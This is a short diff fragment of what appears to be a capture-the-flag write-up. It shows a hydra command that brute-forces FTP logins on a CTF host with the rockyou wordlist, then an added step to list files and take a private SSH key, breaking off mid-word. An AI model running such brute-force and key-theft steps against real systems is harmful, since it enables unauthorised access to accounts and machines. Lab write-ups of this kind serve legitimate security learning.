@@ -12,3 +12,5 @@ After that launch a brute force with hydra on ftp to gain access
 ```
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://elogos.ctf
 ```
+
+ls -la and take the private ssh key. Cra
